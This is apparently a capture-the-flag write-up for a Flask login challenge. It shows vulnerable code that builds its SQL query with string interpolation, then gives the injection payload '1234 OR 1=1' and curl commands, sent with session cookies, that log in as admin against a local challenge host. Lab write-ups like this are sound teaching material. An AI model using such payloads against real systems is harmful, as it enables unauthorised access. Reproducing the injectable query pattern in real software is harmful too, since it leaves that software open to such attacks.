# SQLi 1

## Challenge Description

We are provided with a Flask web application that simulates a login system. The goal is to log in as the `admin` user and retrieve a flag, even though the actual `admin` PIN is unknown.

The application uses **Flask's session system** to track logged-in users and stores a secret `admin` user with a random PIN, which we cannot brute force. However, there is a SQL Injection vulnerability in the login logic.

---

## Source Code Analysis

Relevant code from the `/logon` route:

```python
username = flask.request.form.get("uid")
pin = flask.request.form.get("pin")

if pin[0] not in "0123456789":
    flask.abort(400, "Invalid pin")

query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND pin = { pin }"
user = db.execute(query).fetchone()
```

This code is vulnerable to SQL Injection because it directly injects `username` and `pin` into the SQL query string without sanitization or parameterization.


## SQL Injection Strategy

We can inject SQL syntax to bypass the PIN check and force the query to return a valid row, even if we don't know the correct PIN.

A classic injection payload in the `pin` field:


```SQL
1234 OR 1=1
```

Would transform the query into:

```SQL
SELECT * FROM users WHERE username = 'admin' AND pin = 1234 OR 1=1;
```

This will always evaluate to true due to `OR 1=1`, and return a user row.

## Why My Initial Attempts Failed

When I first tried:

```SHELL
curl -X POST http://challenge.localhost:80/logon \
  -d "uid=admin" \
  -d "pin=1234 OR 1=1"
```
I received a redirect, but then:

```SHELL
curl http://challenge.localhost:80/logon
```

showed the login form again, not the flag.

### Root Cause:

Curl does not retain cookies across requests by default.

Even though the injection was successful and the server set a session cookie, the second `curl` command did not include the session cookie, so the server treated me as a guest.

## Final Working Solution

To retain the session across requests, I used `curl` with `-c` and `-b` options:

### Step 1: Login using SQL Injection and store cookies

``` SHELL
curl -c cookies.txt -X POST http://challenge.localhost:80/logon \
  -d "uid=admin" \
  -d "pin=1234 OR 1=1"
```

### Step 2: Use stored cookies to access `/logon` as admin

```SHELL
curl -b cookies.txt http://challenge.localhost:80/logon
```

### Why This Works

`-c` cookies.txt: Tells curl to save any cookies (including the session cookie Flask sets after login).

`-b` cookies.txt: Tells curl to send those cookies with the next request.

`1234 OR 1=1`: SQL injection to bypass the PIN check.

Because the username is `admin`, Flask stores `"admin"` in `session["user"]`, and we retrieve the flag.